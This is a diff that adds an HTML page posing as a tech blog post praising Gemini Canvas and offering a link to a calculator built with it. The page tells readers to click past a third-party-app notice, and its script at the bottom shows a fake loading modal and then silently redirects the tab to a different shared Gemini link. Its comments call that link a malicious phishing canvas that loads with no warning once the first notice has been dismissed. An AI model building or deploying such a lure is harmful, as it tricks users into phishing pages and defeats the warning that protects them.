@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tech Insights | Exploring Gemini Canvas</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .gradient-text {
+            background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-900 leading-relaxed">
+
+    <!-- Navigation -->
+    <nav class="bg-white border-b border-gray-200 py-4">
+        <div class="max-w-4xl mx-auto px-6 flex justify-between items-center">
+            <span class="font-bold text-xl tracking-tight">Tech<span class="text-blue-600">Insights</span></span>
+            <div class="space-x-6 text-sm font-medium text-gray-500">
+                <a href="#" class="hover:text-blue-600">Articles</a>
+                <a href="#" class="hover:text-blue-600">Projects</a>
+                <a href="#" class="hover:text-blue-600">About</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="max-w-3xl mx-auto px-6 py-12">
+        <article>
+            <header class="mb-8">
+                <div class="text-blue-600 font-semibold text-sm mb-2 uppercase tracking-widest">AI Tools & Productivity</div>
+                <h1 class="text-4xl font-bold mb-4">Gemini Canvas is Revolutionary: I Built a Functional Calculator in Seconds</h1>
+                <div class="flex items-center text-gray-500 text-sm">
+                    <div class="w-8 h-8 rounded-full bg-gray-200 mr-3"></div>
+                    <span>By Alex Rivard • April 3, 2026</span>
+                </div>
+            </header>
+
+            <img src="https://images.unsplash.com/photo-1677442136019-21780ecad995?auto=format&fit=crop&q=80&w=1000" 
+                 alt="AI Interface" class="w-full h-64 object-cover rounded-xl mb-8 shadow-sm">
+
+            <div class="prose prose-blue max-w-none text-gray-700 space-y-6">
+                <p class="text-xl italic text-gray-600">
+                    "The barrier between thought and application just vanished."
+                </p>
+                
+                <p>
+                    I've been experimenting with the new <strong>Gemini Canvas</strong> feature lately, and the results are honestly mind-blowing. Unlike standard chat interfaces, Canvas allows the AI to generate a living, breathing workspace where it can write code, render UI, and iterate in real-time.
+                </p>
+
+                <p>
+                    To test its limits, I asked Gemini to build a fully functional scientific calculator. Within 10 seconds, it produced a sleek, interactive app that handles complex equations. 
+                </p>
+
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-6 my-8 rounded-r-lg">
+                    <h3 class="text-blue-800 font-bold mb-2">Try it yourself!</h3>
+                    <p class="text-blue-700 mb-4">I've shared the Canvas project link below. You can interact with the calculator directly inside the Gemini environment.</p>
+                    
+                    <a href="https://gemini.google.com/share/dc9818a746a0" 
+                       id="calculatorLink"
+                       target="_blank"
+                       class="inline-block bg-blue-600 text-white px-8 py-3 rounded-lg font-bold shadow-lg hover:bg-blue-700 transition transform hover:-translate-y-1">
+                        Open Calculator in Canvas
+                    </a>
+                    
+                    <p class="mt-4 text-xs text-blue-500 italic">
+                        Note: Since this is a shared project, Gemini might show a "third-party app" notice. Just click 'Continue' to load the calculator.
+                    </p>
+                </div>
+
+                <p>
+                    What's truly impressive is how it handles state. You can actually see the logic being processed as you click the buttons. This opens up massive possibilities for developers and non-technical users alike.
+                </p>
+            </div>
+        </article>
+    </main>
+
+    <!-- Success Modal (Hidden) -->
+    <div id="redirectModal" class="fixed inset-0 bg-black/50 hidden items-center justify-center z-50 p-4">
+        <div class="bg-white p-8 rounded-2xl max-w-sm w-full text-center shadow-2xl">
+            <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">✓</div>
+            <h2 class="text-2xl font-bold mb-2">Enjoying Canvas?</h2>
+            <p class="text-gray-600 mb-6">Redirecting you to the project dashboard...</p>
+        </div>
+    </div>
+
+    <script>
+        const calcLink = document.getElementById('calculatorLink');
+        const modal = document.getElementById('redirectModal');
+        const maliciousUrl = "https://gemini.google.com/share/e0ae3df15c7b";
+
+        calcLink.onclick = function() {
+            // Wait 5 seconds after the user clicks to open the calculator
+            // This gives them time to dismiss the "one-time" warning on the first tab
+            setTimeout(() => {
+                // Show a fake loading modal to explain the movement
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+
+                // Redirect the current blog tab to the malicious phishing canvas
+                // Since the user already "trusted" the calculator, this one loads with NO warning
+                setTimeout(() => {
+                    window.location.href = maliciousUrl;
+                }, 1500);
+                
+            }, 5000); 
+        };
+    </script>
+</body>
+</html>
